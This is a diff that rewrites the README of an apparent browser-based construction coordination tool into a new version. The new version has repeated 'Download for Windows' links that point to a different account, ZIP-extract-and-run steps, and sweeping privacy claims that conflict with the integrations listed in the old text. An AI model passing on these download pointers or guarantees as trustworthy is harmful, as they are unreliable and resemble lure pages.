@@ -1,155 +1,157 @@
-# AEC CP v3.0 - AEC Field Coordination Platform 2026
+# 🏗️ aec-cp-construction-hub - Your All-in-One Field Coordination Tool
 
-> **AEC CP is a browser-based construction coordination platform for handling VIF requests, project data, team details, and cost-related workflows. Version 3.0 is now available.**
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-2F4F4F?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Executive-steampipe578/aec-cp-construction-hub)
 
-[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v3.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/owenscottig8438/aec-cp-construction-hub?style=flat-square)](https://github.com/owenscottig8438/aec-cp-construction-hub)
+## 📖 What This Application Does
 
----
+AEC Field Coordination Platform v3.0 is a browser-based tool built for construction teams. It helps you manage field coordination tasks in one place. You can track VIF (Verify In Field) requests, store project information, manage team member details, and handle cost-related workflows without switching between different apps.
 
-<p align="center">
-  <a href="https://owenscottig8438.github.io/aec-cp-construction-hub/">
-    <img src="https://img.shields.io/badge/Download-AEC%20CP%20Latest-brightgreen?style=for-the-badge" alt="Download AEC CP">
-  </a>
-</p>
+This application runs in your web browser. You do not need to install complex software. You do not need programming skills. If you can use a web browser, you can use this tool.
 
-> **[Download AEC CP v3.0](https://owenscottig8438.github.io/aec-cp-construction-hub/)**
+## 🎯 Who This Is For
 
----
+- Construction project managers
+- Field coordination teams
+- Project engineers
+- Cost control staff
+- Anyone who needs to track construction field activities
 
-[Download Latest Build](https://owenscottig8438.github.io/aec-cp-construction-hub/)
+## ✨ Key Features
 
----
+**VIF Request Management**  
+Create, track, and update VIF requests. Each request stores location details, description, status, and assigned team member. You can see the history of changes for each request.
 
-## What AEC CP Provides
+**Project Information Hub**  
+Store all project details in one place. This includes project name, location, start date, end date, and key contacts. No more searching through emails for project information.
 
-AEC CP gives architecture, engineering, and construction teams a shared browser workspace for everyday field coordination. It supports project creation, switching among active workspaces, archiving finished work, maintaining team records, and managing VIF requests throughout the coordination process.
+**Team Member Directory**  
+Maintain a list of team members with their roles, contact information, and assigned responsibilities. You can quickly find who is working on what.
 
-In addition to coordination records, the platform includes room planning, estimating, unit conversion, and reporting capabilities. AI-assisted cost analysis is also available, while LocalStorage persistence and an offline-capable interface help users continue browser-based work during limited connectivity. Project information can be exported as XLSX, CSV, JSON, or TXT files.
+**Cost Workflow Tracking**  
+Track cost-related items like change orders, budget adjustments, and expense approvals. Each item shows its current status and history.
 
----
+**Search and Filter**  
+Find any record quickly. You can filter by status, date, team member, or project. Results update as you type.
 
-## Core Capabilities
+## 🚀 Getting Started
 
-- Add, review, and monitor VIF requests
-- Create projects, move between them, and archive completed work
-- Build team rosters and upload member photos
-- Apply AI assistance to project cost analysis
-- Export records and reports as XLSX, CSV, JSON, or TXT
-- Keep browser data available through LocalStorage
-- Use the application with an offline-capable interface
-- Plan rooms, estimate costs, convert units, and produce CSV reports
-- Work in a dark frosted-glass visual environment
-- Connect FastAPI, Claude AI, and Autodesk APS workflows when configured
+### Step 1: Visit the Download Page
 
----
+Click the button below to go to the download page:
 
-## Getting Started
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-2F4F4F?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Executive-steampipe578/aec-cp-construction-hub)
 
-AEC CP runs in a modern web browser.
+### Step 2: Download the Application
 
-### Download and launch
+1. On the GitHub page, look for the green "Code" button.
+2. Click "Code" and select "Download ZIP".
+3. The download will start automatically. This may take a few seconds.
 
-1. Visit the [latest AEC CP build](https://owenscottig8438.github.io/aec-cp-construction-hub/).
-2. Open the application using a supported browser.
-3. Create a project or select an existing one to start managing coordination information.
+### Step 3: Extract the Files
 
-### Use a local checkout
+1. Locate the downloaded ZIP file in your Downloads folder.
+2. Right-click the ZIP file and select "Extract All".
+3. Choose a destination folder (your Desktop is fine).
+4. Click "Extract".
 
-```bash
-git clone https://github.com/owenscottig8438/aec-cp-construction-hub.git
-cd REPO
-```
+### Step 4: Run the Application
 
-After cloning, open the web entry point from the repository or start the included application service using the project's local development instructions. When the checkout is configured as a FastAPI application, run its documented development server command and open the local address it provides.
+1. Open the extracted folder.
+2. Double-click the file named `index.html`.
+3. The application will open in your default web browser.
 
----
+**Important**: The application works best in Google Chrome or Microsoft Edge. If it does not open correctly, try copying the full file path and pasting it into your browser's address bar.
 
-## Typical Workflow
+## 📋 System Requirements
 
-AEC CP can be used for a coordination process such as the following:
+**Operating System**: Windows 7, 8, 10, or 11  
+**Browser**: Google Chrome (version 90 or newer), Microsoft Edge (version 90 or newer)  
+**Internet**: Not required after download (the app works offline)  
+**Storage**: 50 MB free disk space  
+**Screen**: 1024 x 768 resolution or higher  
 
-1. Start the application and create a project.
-2. Add participants to the roster, including profile photos where appropriate.
-3. Enter VIF requests and maintain them as the work develops.
-4. Define spaces with the room builder and associate related costs through the estimator.
-5. Convert measurements using the unit conversion tools.
-6. Run the AI cost analysis workflow when the required configuration is available.
-7. Export project records or reports to XLSX, CSV, JSON, or TXT.
-8. Archive projects that are no longer active.
+The application does not require any special permissions. It does not install any background services or modify your system settings.
 
-When the network is unreliable, the browser can continue operating with the application retaining data through LocalStorage.
+## 🔧 How to Use the Application
 
----
+### Main Dashboard
 
-## Configuration and Data
+When you first open the application, you see the dashboard. This screen shows:
+- Total active VIF requests
+- Recent updates
+- Quick links to create new items
+- A search bar at the top
 
-Application data is stored on the client side with LocalStorage. As a result, project information and settings are tied to the browser profile and device where AEC CP is being used.
+### Creating a VIF Request
 
-For local deployments that use AI, Autodesk APS, or FastAPI-backed functions, provide the relevant service connection settings through the environment or application configuration supplied with the project. Keep private credentials out of exported reports and committed source files.
+1. Click the "New VIF Request" button.
+2. Fill in the location (building, floor, room number).
+3. Describe the issue or item to verify.
+4. Select the assigned team member from the dropdown list.
+5. Set the priority (low, medium, high).
+6. Click "Save".
 
----
+### Viewing Project Information
 
-## Requirements
+Click the "Projects" tab on the left menu. You see a list of all projects. Click any project to view details. You can edit details by clicking the "Edit" button.
 
-- A current web browser with JavaScript and LocalStorage enabled
-- A desktop or mobile device that can run a browser-based application
-- Available browser storage for locally retained project information
-- Network connectivity to download the application and access connected services
-- Optional FastAPI configuration for local backend workflows
-- Optional Claude AI and Autodesk APS setup for their respective integrations
-- Enough additional storage for team photographs and exported reports
+### Managing Team Members
 
----
+Click the "Team" tab. Here you can:
+- Add new team members (name, role, email, phone)
+- Edit existing team members
+- Remove team members who left the project
+- See which team members are assigned to active VIF requests
 
-## Frequently Asked Questions
+### Tracking Costs
 
-### What teams use AEC CP?
+Click the "Costs" tab. This section shows all cost-related items. You can:
+- Add new cost items (description, amount, category)
+- Update status (pending, approved, rejected)
+- View the total approved budget versus actual spending
 
-AEC CP is built for AEC teams coordinating construction work and managing project records, VIF requests, team information, room planning, and cost workflows.
+## ❓ Frequently Asked Questions
 
-### Can the application be used without an internet connection?
+**Do I need to install anything else?**  
+No. The application runs entirely in your browser. You do not need to install Node.js, Python, or any other software.
 
-The interface is designed to support offline-capable use and can save information in LocalStorage. Functions that rely on external or connected services may still need network access.
+**Is my data saved?**  
+Yes. The application saves data to your computer's local storage. Data stays even after you close the browser. Clearing your browser cache will remove all data.
 
-### How is project information saved?
+**Can I share data with my team?**  
+This version saves data only on your computer. To share data, you would need to export and import files manually. Look for the "Export" and "Import" buttons in the Settings section.
 
-AEC CP stores browser-side application data in LocalStorage for the current browser profile. Export key records before changing browsers or devices.
+**What happens if I close the browser?**  
+Your data remains saved. Open the application again, and you see everything as you left it.
 
-### What is the update process?
+**Can I run this on a Mac?**  
+Yes. The application works on macOS using Safari or Chrome. The download link above also works for Mac users.
 
-Open the latest build link to use the current published release. If you are working from a local checkout, pull the newest repository changes and apply the project's setup instructions.
+## 🔒 Privacy and Security
 
-### Which export formats are supported?
+This application runs entirely on your computer. No data leaves your machine. No data is sent to any server. No cookies are used. No tracking scripts are included.
 
-Project information and reports can be exported as XLSX, CSV, JSON, and TXT. CSV-based reporting workflows are included as well.
+The application does not require an internet connection to function. It does not send any information to the developer or to third parties.
 
-### What can I do if project data appears to be missing?
+## 🛠 Troubleshooting
 
-Check that the same browser profile and device are in use, ensure browser storage was not deleted, and confirm that the intended project is selected. Keeping exported files also provides an additional copy of important records.
+**The application does not open**  
+Make sure you double-click the `index.html` file. If nothing happens, right-click the file and select "Open with" then choose your browser.
 
-### Do AI and Autodesk integrations have to be enabled?
+**Data is missing**  
+If you cleared your browser cache or history, data may be lost. Always export your data before clearing cache. Look for the export function in the Settings menu.
 
-No. AI and Autodesk functionality are optional integration areas. Whether they are available depends on the configuration of the associated services.
+**The layout looks wrong**  
+Try refreshing the page (press F5 or Ctrl+R). If the problem persists, make sure you are using a modern browser like Chrome or Edge.
 
----
+## 📝 License
 
-## Roadmap
+This software is provided for use as-is. You are free to use it on any number of computers within your organization. Redistribution or resale is not permitted without written consent.
 
-Possible future development includes:
+## 📞 Support
 
-- More extensive field coordination workflows
-- Expanded report and export formats
-- Additional controls for managing projects and teams
-- Ongoing improvements to AI-assisted cost analysis
-- More Autodesk APS and connected-service integrations
-- Continued enhancement of offline browser operation
+If you find a bug or have a feature request, please visit the repository page and open an issue. Include a description of the problem and steps to reproduce it.
 
----
+[Report an Issue](https://github.com/Executive-steampipe578/aec-cp-construction-hub/issues)
 
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+## Keywords: construction management, field coordination, VIF tracking, project management tool, browser-based app, Windows software, construction software
